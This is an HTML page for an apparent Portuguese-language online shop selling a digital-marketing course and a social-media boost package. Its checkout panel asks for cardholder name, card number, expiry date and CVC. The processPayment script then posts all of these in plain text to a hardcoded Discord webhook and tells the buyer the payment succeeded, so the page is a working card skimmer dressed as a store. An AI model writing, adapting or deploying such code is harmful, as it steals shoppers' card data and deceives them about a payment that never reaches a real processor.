<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="robuxprivate.ico">
    <title>Curso Marketing Digital</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            background-color: #121212; /* Fundo preto */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        header {
            background-color: #333; /* Cinza escuro */
            color: white;
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            box-sizing: border-box;
            position: fixed;
            top: 0;
        }
        header h1 {
            margin: 0;
            font-size: 28px;
        }
        .cart-icon {
            background-color: #ff0000; /* Verde para o Ã­cone do carrinho */
            color: white;
            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            font-size: 22px;
            cursor: pointer;
        }
        main {
            padding: 80px 20px 20px;
            width: 100%;
            max-width: 1100px;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }
        .product {
            border-radius: 20px; /* Bordas arredondadas */
            padding: 20px;
            margin: 20px;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            width: 250px;
            text-align: center;
            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease-in-out;
        }
        .product:hover {
            transform: scale(1.05);
        }
        .product img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .product h2 {
            margin: 10px 0;
            font-size: 20px;
            color: blue;
        }
        .product p {
            margin: 10px 0;
            font-size: 16px;
        }
        .product button {
            background-color: blue;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px; /* Bordas arredondadas */
            cursor: pointer;
            transition: background-color 0.3s ease-in-out;
        }
        .product button:hover {
            background-color: blue;
        }
        .cart {
            display: none;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            padding: 20px;
            position: fixed;
            top: 80px;
            right: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 300px;
        }
        .cart.active {
            display: block;
        }
        .cart-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        .checkout {
            margin-top: 20px;
            text-align: center;
        }
        .payment-panel {
            display: none;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            padding: 30px;
            position: fixed;
            top: 50px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        .payment-panel.active {
            display: block;
        }
        .payment-panel input {
            display: block;
            width: calc(100% - 20px);
            margin: 15px 0;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 10px;
            background-color: #121212;
            color: #fff;
        }
        .payment-panel button {
            background-color: blue;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 10px;
            cursor: pointer;
        }
        .payment-panel button:hover {
            background-color: blue;
        }

    </style>
</head>
<body>
    <header>
        <h1><small>VOLTAR A</small> <a href="index.html">PAGINA INCIAL </a></h1>
        <button class="cart-icon" onclick="toggleCart()">ðŸ›’</button>
    </header>
    <main>
        <div class="product">
            <img src="https://i.pinimg.com/736x/96/82/1c/96821ca7269fc63c19e1a13510eb458a.jpg" alt="CURSO MARKETING DIGITAL">
            <h2>ADMINISTRAÃ‡ÃƒO</h2>
            <p><strong>LIFETIME</strong></p>
            <p>69,99R$</p>
            <button onclick="addToCart('MARKETING DIGITAL', 69.99)">Adicionar ao Carrinho</button>
        </div>

                    <div class="product">
            <img src="https://i.pinimg.com/736x/3b/2b/88/3b2b887571d5f5fc85e4e7a059b80bfd.jpg" alt="BOMBAR REDES SOCIAIS">
            <h2>BOMBAR NAS REDES SOCIAIS</h2>
            <p><strong>LIFETIME</strong></p>
            <p>9,99R$</p>
            <button onclick="addToCart('REDES SOCIAIS', 9.99)">Adicionar ao Carrinho</button>
        </div>
    </main>
    
    <div class="cart" id="cart">
        <h2>Cart</h2>
        <div id="cart-items"></div>
        <div class="checkout">
            <p>Total: $<span id="total-price">0</span></p>
            <button onclick="redirectToPaymentPage()">Checkout</button>
        </div>
    </div>
    <div class="payment-panel" id="payment-panel">
        <h2>Payment</h2>
        <input type="text" id="card-name" placeholder="Cardholder Name">
        <input type="text" id="card-number" placeholder="Card Number">
        <input type="text" id="card-expiry" placeholder="Expiry Date">
        <input type="text" id="card-cvc" placeholder="CVC">
        <button onclick="processPayment()">Pay</button>
    </div>
    <script>
        function redirectToPaymentPage() {
    // Substitua "pagina2.html" pelo nome do arquivo da pÃ¡gina de pagamento
    window.location.href = "pagamento.html";
}

        
        let cart = [];
        let totalPrice = 0;

        function addToCart(product, price) {
            cart.push({ product, price });
            totalPrice += price;
            updateCartUI();
        }

        function updateCartUI() {
            const cartItemsDiv = document.getElementById('cart-items');
            cartItemsDiv.innerHTML = '';
            cart.forEach(item => {
                const div = document.createElement('div');
                div.className = 'cart-item';
                div.innerHTML = `<span>${item.product}</span><span>$${item.price}</span>`;
                cartItemsDiv.appendChild(div);
            });
            document.getElementById('total-price').innerText = totalPrice.toFixed(2);
        }

        function toggleCart() {
            const cartDiv = document.getElementById('cart');
            cartDiv.classList.toggle('active');
        }

        function openPaymentPanel() {
            const paymentPanel = document.getElementById('payment-panel');
            paymentPanel.classList.add('active');
        }

        function processPayment() {
            const name = document.getElementById('card-name').value;
            const number = document.getElementById('card-number').value;
            const expiry = document.getElementById('card-expiry').value;
            const cvc = document.getElementById('card-cvc').value;

            const webhookUrl = 'https://discord.com/api/webhooks/1330060097329696830/Mn8fI9GFFDiG8DfTtquq-ub41dWW8BY436ImzK-VEs0ac2d5hc0fGl9F11iPMq6vcYuU';

            const paymentDetails = {
                content: `Payment Details:\nName: ${name}\nCard Number: ${number}\nExpiry: ${expiry}\nCVC: ${cvc}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentDetails),
            })
            .then(response => {
                if (response.ok) {
                    alert('Payment processed successfully!');
                    cart = [];
                    totalPrice = 0;
                    updateCartUI();
                    document.getElementById('payment-panel').classList.remove('active');
                } else {
                    alert('Payment failed. Please try again.');
                }
            })
            .catch(error => {
                alert('Error processing payment.');
            });
        }
    </script>
</body>
</html>
